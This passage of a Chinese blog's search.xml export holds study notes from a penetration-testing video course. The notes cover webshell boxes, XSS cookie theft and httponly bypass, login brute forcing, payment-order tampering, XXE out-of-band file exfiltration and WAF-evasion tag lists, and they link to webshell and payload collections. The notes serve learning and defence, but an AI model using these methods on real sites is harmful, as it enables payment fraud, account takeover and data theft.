<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">拓展–可二刷(没怎么看懂,好像是通过XSS跨站脚本远程盗取cookie到自己的主机上并保存):15:00-34：30</a></p>
<h2 id="webshell箱子系统XSS盲打-工具"><a href="#webshell箱子系统XSS盲打-工具" class="headerlink" title="webshell箱子系统XSS盲打_工具"></a>webshell箱子系统XSS盲打_工具</h2><h3 id="基础名词认识"><a href="#基础名词认识" class="headerlink" title="基础名词认识"></a>基础名词认识</h3><p>1、后门(backdoor):后门一般是指绕过安全性控制而获取对程序或系统访问的程序，后门原本是开发者预留的用来后期修改程序或系统中存在的威胁，但是由于黑客对后门的恶意使用，使得后门成为了计算机安全得一大威胁，一旦计算机系统或程序中的后们被黑客发现，那么黑客就能轻易地通过后门达到入侵目标计算机 的目的。常见的后门包括：（网页后门）（线程插入后门）（扩展后门）（C&#x2F;S后门）。后门包括网页后门。<br>2、网站后门(webshell):Webshell就是以asp、php、jsp或cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。Webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，JSP脚本木马，也有基于.NET的脚本木马。根据时代和技术的变迁，也有用python和lua编写的脚本木马，常用有如下几种(常用的还是一句话木马)：<br>大马:体积大，功能全；会调用系统关键函数；以代码加密进行隐藏<br>小马:体积小，功能少；一般只有一个上传功能，用于上传大马<br>一句话木马:代码短；使用场景大，可单独生成文件，可插入文件；安全性高，隐藏性强，可变形免杀；框架不变，数据执行，数据传递；使用客户端管理webshell，省去使用命令行以及各种参数配置，可以使用中国蚁剑图形化操作webshell。一句话木马,通过菜刀、冰蝎、蚁剑去控制网站。<br>打包马:主要用于打包网站源码<br>拖库马:主要用于导出网站数据库<br>内存马:无文件落地；极难检测和发现；难以清除<br>3、实例1：WebShell攻击事件<br>某公司的财务系统在使用过程中突然出现了异常状况，经过检查发现是黑客利用一处上传文件漏洞，植入了一个PHP WebShell程序。由于黑客使用了加密技术，因此该WebShell长时间未被检测到。后来负责人调取了完整数据日志后才追查到了这个问题。<br>4、实例2：后门攻击事件<br>某商业银行网络系统出现严重安全问题，运营商辗转发现了一个可疑的进程。进一步调查发现，黑客在6个高频交易服务器上分别植入了后门程序，并同时控制了一个小型内网计算机群。通过对该群的掌控，黑客获得了银行存款、投资等多项信息，损失达数百万元。<br>参考资料:<br><a href="https://www.shangyouw.cn/shezhi/arc293044.html">https://www.shangyouw.cn/shezhi/arc293044.html</a><br><a href="https://blog.csdn.net/Spontaneous_0/article/details/129462860">https://blog.csdn.net/Spontaneous_0/article/details/129462860</a><br><a href="https://zhuanlan.zhihu.com/p/549851099">https://zhuanlan.zhihu.com/p/549851099</a><br>5、webshell箱子:被称为后门中的后门,即后门代码中再插入后门语句。将盗取的网站权限收集起来。它可以让你在webshell中植入后门，当别人用你植入过后门的webshell去获取渗透别的网站时，你的webshellbox信封将会收到他留下的后门地址以及密码。也就是说免费帮别人挖洞。<br>网站后门下载地址:<a href="https://github.com/tennc/webshell(%E5%BB%BA%E8%AE%AE%E6%95%B4%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA)">https://github.com/tennc/webshell(建议整到虚拟机)</a><br>webshell箱子搭建教程:<a href="https://blog.csdn.net/weixin_45951067/article/details/121308040">https://blog.csdn.net/weixin_45951067/article/details/121308040</a></p>
<h3 id="webshell箱子系统XSS盲打"><a href="#webshell箱子系统XSS盲打" class="headerlink" title="webshell箱子系统XSS盲打"></a>webshell箱子系统XSS盲打</h3><p>既然已知webshell箱子是一个后门中的后门,那么也可以设计一个后门中的后门中的后门,反日坐享其成的那个dm。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">讲解webshell箱子以及反日:35:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">判定一个文件有无后门以及网络真实环境反日:56:20&#x2F;59:45</a><br>判定一个文件有无后门:直接抓包即可,看有没有向莫名其妙的ip地址发送数据包。</p>
<h3 id="结合BeEF实现跨站"><a href="#结合BeEF实现跨站" class="headerlink" title="结合BeEF实现跨站"></a>结合BeEF实现跨站</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">结合BeEF实现跨站:1:02:33</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、跨站漏洞常出现在存在留言板、评论区、订单系统、反馈条件等网站。<br>2、有时候成功盗取了cookie,但还是登陆不了对方的后台,这是因为对方开启了session验证。管理员在浏览器复制自己的cookie包含session,但攻击者盗取不了session。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">大概讲了一下如何获取session(不是很懂):1:30:00</a><br>–好像是通过phpinfo()打印当前访问者的完整cookie,然后访问即可获取到。(可结合文件上传)</p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>XSS跨站</tag>
      </tags>
  </entry>
  <entry>
    <title>登陆脆弱|支付篡改</title>
    <url>/2023/10/18/zhificuangai/</url>
    <content><![CDATA[<p><img src="https://pic.imgdb.cn/item/652e9c6bc458853aef0bd201.png" alt="图一" title="逻辑越权学习"></p>
<h2 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h2><p>1.登录点暴力破解<br>2.HTTP&#x2F;HTTPS 传输<br>3.Cookie 脆弱点验证<br>4.Session 固定点测试<br>5.验证密文比对安全测试</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">http与https协议密文抓取:3:30</a><br>(1)、https一般传输数据加密(密码),而http(一般是明文传输)不是。<br>(2)、爆破时,应当注意把payload换成密文。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">后台登录账号密码爆破测试:10:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Cookie 脆弱点验证:21:10</a><br>1、get到一个小知识,就是如果网址的一个属性是?r&#x3D;index而不是存在后缀(?r&#x3D;index.php之类的)的,那么考虑其存在文件包含。<br>2、找cookie脆弱点:<br>白盒:代码审计,发现只要登陆时,cookie不为空就可以成功进入后台,cookie为空就返回登陆界面。<br>黑盒:看数据包的cookie中的参数。</p>
<h3 id="业务"><a href="#业务" class="headerlink" title="业务"></a>业务</h3><p>数据篡改安全问题<br>参考：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a><br>商品购买流程：<br>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付<br>常见篡改参数：<br>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等<br>常见修改方法：<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">商场系统商品支付逻辑测试–数量、订单编号:40:00</a><br>(1)、感触比较深的是改订单编号的,开两个订单,一个买十件,一个买一件,用一件的编号指向十件的,可以实现低价购。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">建站系统商品支付逻辑测试–价格、商品编号:51:40</a><br>(1)、数据包有一些东西不可乱改,要多抓包,对比,找出能改的字段。<br>(2)、价格应该要存储在数据库中读取出来,而不是给机会给用户可以修改。<br>(3)、token–数据包的唯一性,若果数据包设计了token,那么就应该不会出现改商品编号就能以低价格买高价格的商品的漏洞。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">支付接口的修改:1:04:00</a><br>(1)、指向自己指定的支付接口。</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE|XML|利用检测绕过</title>
    <url>/2023/10/24/xxexml/</url>
    <content><![CDATA[<h2 id="大纲-总括"><a href="#大纲-总括" class="headerlink" title="大纲|总括"></a>大纲|总括</h2><p><img src="https://pic.imgdb.cn/item/6537dd1bc458853aefa9742c.png" alt="图一" title="xxe|xml"></p>
<h2 id="XML-语言-传输数据的一种类型-XXE-漏洞-基本知识"><a href="#XML-语言-传输数据的一种类型-XXE-漏洞-基本知识" class="headerlink" title="XML(语言|传输数据的一种类型)|XXE(漏洞)|基本知识"></a>XML(语言|传输数据的一种类型)|XXE(漏洞)|基本知识</h2><h3 id="xml-xxe基础概念"><a href="#xml-xxe基础概念" class="headerlink" title="xml|xxe基础概念"></a>xml|xxe基础概念</h3><p>参考：<a href="https://blog.csdn.net/m0_63917373/article/details/127654477">https://blog.csdn.net/m0_63917373/article/details/127654477</a><br>1、XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。<br>2、XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。<br>3、XXE（XML External Entity）是一种攻击技术，利用了XML解析器的功能来加载外部实体。<br>4、DTD（Document Type Definition）是一种用于定义XML文档结构的规范，其中可以定义实体（Entity）。<br>5、实体是XML中的一种特殊元素，可以用来表示常量值或者引用外部资源。在DTD中，可以使用实体来定义一些常用的字符串，然后在XML文档中使用实体引用来代替这些字符串。例如，可以在DTD中定义一个实体<!ENTITY company "ABC Company">，然后在XML文档中使用&company;来引用这个实体，这样就可以将ABC Company作为一个常量值在XML文档中使用。<br>6、!XXE攻击利用了XML解析器对外部实体的支持，攻击者构造恶意的XML文档，其中包含对外部实体的引用。当解析器解析这个恶意的XML文档时，会尝试加载外部实体，攻击者可以利用这个机制来读取敏感文件、执行远程请求等。</p>
<h3 id="XML和XXE区别"><a href="#XML和XXE区别" class="headerlink" title="XML和XXE区别"></a>XML和XXE区别</h3><p>1、XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。<br>2、XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
<h3 id="XML-与-HTML-的主要差异："><a href="#XML-与-HTML-的主要差异：" class="headerlink" title="XML 与 HTML 的主要差异："></a>XML 与 HTML 的主要差异：</h3><p>1、XML 被设计为传输和存储数据,其焦点是数据的内容。<br>2、HTML 被设计用来显示数据,其焦点是数据的外观。<br>3、HTML 旨在显示信息,而 XML 旨在传输信息。</p>
<h3 id="xxe攻击流程"><a href="#xxe攻击流程" class="headerlink" title="xxe攻击流程:"></a>xxe攻击流程:</h3><p>攻击者构造恶意的XML文档，其中包含对外部实体的引用。<br>攻击者将恶意的XML文档发送给目标系统，触发XML解析器解析。<br>XML解析器在解析过程中尝试加载外部实体。<br>如果加载成功，攻击者可以读取外部实体的内容，例如敏感文件的内容。<br>攻击者可以利用外部实体的内容进行进一步的攻击，例如执行远程请求。</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">pikachu靶场XML-知识点:回显，玩法，协议，引入:4:40</a><br>1、XML|DTD学习:<br><a href="https://blog.csdn.net/lxz352907839/article/details/127531994">https://blog.csdn.net/lxz352907839/article/details/127531994</a><br><a href="https://www.cnblogs.com/ForEvErNoME/p/2373384.html">https://www.cnblogs.com/ForEvErNoME/p/2373384.html</a><br>2、引入外部实体DTD：会将DTD文件的内容当作XML代码执行。<br>(1)条件:对方网站没有禁止引入外部实体DTD。<br>(2)类似于远程文件包含,可以自定义代码攻击,可以绕过一些防御的软件或者代码(payload中的ip改为自己的)。<br>3、无回显情况(反向连接的思路)<br>通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。(就是构造这样的payload:让对方服务器去请求某一个目标文件,然后让他访问我们自己的IP下的DTD文件,随后我们可以在这个DTD文件里设计访问日志或者构造php文件接收来查看数据)。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">xxe|协议-读文件(绕过对方的过滤)–思路:30:45</a><br>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">xxe-lab靶场登录框xml数据传输测试–检测发现xxe:35:40</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CTF-Jarvis-OJ-Web-XXE|真题|数据请求格式:46:50</a><br>1、这里就是盲猜,把type值改为application&#x2F;xml然后构造payload放进去看有没有被执行。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CTF-Vulnhub(非vulhub)-XXE安全漏洞复现(重点)-实战:50:22</a><br>1、vulnhub更贴近实战,但是对内存要求较高。<br>2、用file协议读取文件需要这个文件的完整路径(绝对路径),但是用php的去读取只需文件名(相对路径,默认在当前目录(注意不是根目录)下找目标文件)。<br>3、”.&#x2F;“和”..&#x2F;“都是用于指定文件路径的相对路径符号。<br>“.&#x2F;“表示当前目录，用于引用当前目录下的文件或文件夹。例如，”.&#x2F;file.txt”表示当前目录下的file.txt文件。<br>“..&#x2F;“表示上级目录，用于引用上级目录下的文件或文件夹。例如，”..&#x2F;folder&#x2F;file.txt”表示上级目录中的folder文件夹下的file.txt文件。<br>因此，”.&#x2F;“和”..&#x2F;“的区别在于引用的目录位置不同。”.&#x2F;“表示当前目录，而”..&#x2F;“表示上级目录。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">xxe工具使用-实战:1:20:50</a></p>
<h2 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h2><p><img src="https://pic.imgdb.cn/item/653a84cec458853aeff65266.jpg" alt="图二" title="XXE防御"></p>
]]></content>
  </entry>
  <entry>
    <title>XSS跨站代码以及绕过</title>
    <url>/2023/10/11/xss3/</url>
    <content><![CDATA[<h2 id="XSS跨站绕过过滤的思路与方法"><a href="#XSS跨站绕过过滤的思路与方法" class="headerlink" title="XSS跨站绕过过滤的思路与方法"></a>XSS跨站绕过过滤的思路与方法</h2><h3 id="httponly绕过"><a href="#httponly绕过" class="headerlink" title="httponly绕过"></a>httponly绕过</h3><h3 id="什么是httponly"><a href="#什么是httponly" class="headerlink" title="什么是httponly"></a>什么是httponly</h3><p>在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击。注意并不能防止xss漏洞，只能是防止cookie被盗取。</p>
<h3 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h3><p>绕过 httponly：<br>利用账号密码进入<br>1、若浏览器未保存帐号密码：需要 xss 产生登录地址(前提是XSS漏洞需要存在于登录框)，利用表单劫持(相当于发一份给跨站平台,一份发给服务器验证)。<br>2、若浏览器保存帐号密码：浏览器读取帐号密码。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=26&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">如何绕过httponly:8:00</a></p>
<h3 id="XSS跨站代码绕过-偏教程演示–配合代码审计"><a href="#XSS跨站代码绕过-偏教程演示–配合代码审计" class="headerlink" title="XSS跨站代码绕过(偏教程演示–配合代码审计)"></a>XSS跨站代码绕过(偏教程演示–配合代码审计)</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=26&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">靶场练习(重点):37:00</a></p>
<h3 id="WAF绕过-以安全狗为例"><a href="#WAF绕过-以安全狗为例" class="headerlink" title="WAF绕过(以安全狗为例)"></a>WAF绕过(以安全狗为例)</h3><h4 id="常见WAF绕过思路"><a href="#常见WAF绕过思路" class="headerlink" title="常见WAF绕过思路"></a>常见WAF绕过思路</h4><p>1、标签语法替换</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">  <span class="tag">&lt;<span class="name">a</span>&gt;</span>  <span class="tag">&lt;<span class="name">p</span>&gt;</span>  <span class="tag">&lt;<span class="name">img</span>&gt;</span>  <span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span>&gt;</span>  <span class="tag">&lt;<span class="name">var</span>&gt;</span>  <span class="tag">&lt;<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>  <span class="tag">&lt;<span class="name">object</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span>&gt;</span> </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>  <span class="tag">&lt;<span class="name">keygen</span>&gt;</span> <span class="tag">&lt;<span class="name">frameset</span>&gt;</span>  <span class="tag">&lt;<span class="name">embed</span>&gt;</span>  <span class="tag">&lt;<span class="name">svg</span>&gt;</span>  <span class="tag">&lt;<span class="name">math</span>&gt;</span>  <span class="tag">&lt;<span class="name">video</span>&gt;</span>  <span class="tag">&lt;<span class="name">audio</span>&gt;</span> <span class="tag">&lt;<span class="name">select</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=27&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">标签语法替换演示二:12：00</a><br>2、特殊符号干扰(#)–&#x2F;在js内代表一个语句的结束<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=27&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">特殊符号干扰演示一:1：30</a><br>3、提交方式更改–get、post、cookie等提交方式<br>4、垃圾数据溢出<br>5、加密解密算法<br>6、结合其他漏洞绕过–XSStrike自动化实现、burp抓包用字典跑</p>
<h3 id="相关阅读资料"><a href="#相关阅读资料" class="headerlink" title="相关阅读资料"></a>相关阅读资料</h3><p>1、XSS在线fuzz工具:<a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a> (自动生成payload)<br>2、WAF攻防笔记:<a href="https://www.yuque.com/office/yuque/0/2023/pdf/34523688/1696908471868-e27eb882-ee6f-46d2-8763-c5a9d9d0047b.pdf?from=https://www.yuque.com/weiker/xiaodi/dmabuqh96629o9yp">https://www.yuque.com/office/yuque/0/2023/pdf/34523688/1696908471868-e27eb882-ee6f-46d2-8763-c5a9d9d0047b.pdf?from=https%3A%2F%2Fwww.yuque.com%2Fweiker%2Fxiaodi%2Fdmabuqh96629o9yp</a><br>3、XSStrike强大的自动化工具：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>4、绕过XSS检测详解以及payload参考：<a href="https://bbs.kanxue.com/thread-250852.htm">https://bbs.kanxue.com/thread-250852.htm</a><br>4、fuzz-XSS字典:<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<h3 id="相关防御XSS思路"><a href="#相关防御XSS思路" class="headerlink" title="相关防御XSS思路"></a>相关防御XSS思路</h3><p>开启 httponly,输入过滤，输出过滤等<br>PHP:<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a><br>JAVA:<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p>
<h3 id="little-总结"><a href="#little-总结" class="headerlink" title="little 总结"></a>little 总结</h3><p>1、一般来说网站存在对于XSS跨站漏洞的代码过滤,我们如何考虑绕过这些代码过滤呢?其实同前面的SQL注入以及文件上传的思路一样,考虑大小写、有没有循环过滤、双写、编码、coookie、post提交方式等的过滤方式,要懂得发散思维。(白盒环境下好测试)<br>2、听课时,提到了来源referer这个过滤验证。在XSS里关联性并不大,但与CRSF、SSRF息息相关。下列是迪总对于这个的一点形象的解释:<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=26&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">对于来源检测的解释:1:18:00</a><br><img src="https://pic.imgdb.cn/item/6527cbb1c458853aeff61a0d.png" alt="图一" title="对于来源检测的解释"></p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>XSS跨站</tag>
      </tags>
  </entry>
</search>
